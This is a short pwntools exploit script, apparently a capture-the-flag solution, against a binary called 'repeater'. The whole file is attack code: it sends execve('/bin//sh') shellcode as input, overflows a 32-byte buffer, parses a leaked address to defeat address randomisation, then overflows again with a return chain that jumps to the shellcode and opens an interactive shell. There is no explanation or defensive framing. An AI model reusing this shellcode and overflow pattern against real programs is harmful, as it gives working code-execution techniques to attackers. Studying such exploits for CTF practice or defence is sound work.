from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
breakrva 0xa96
breakrva 0xae9
breakrva 0xb41
continue
'''.format(**locals())

#Binary filename
exe = './repeater'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

offset = 0x20160D
shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

p.recvuntil(b"name :\n")
p.sendline(shellcode)

p.sendlineafter(b"input :", b"a"*32 + p64(0x321321))

p.recvuntil(b"0x")
leak = int(p.recv(12),16)
elf.address = leak - 0xa33
ret = elf.address + 0x73e
log.info("leak = " + hex(elf.address))
log.info("leak = " + hex(leak))

shell_addr = leak + 0x20160D
log.info("shell_addr = " + hex(shell_addr))

p.sendlineafter(b"input :", b"a"*32 + p64(0) + p64(ret)* 2 + p64(shell_addr)) 

p.interactive()
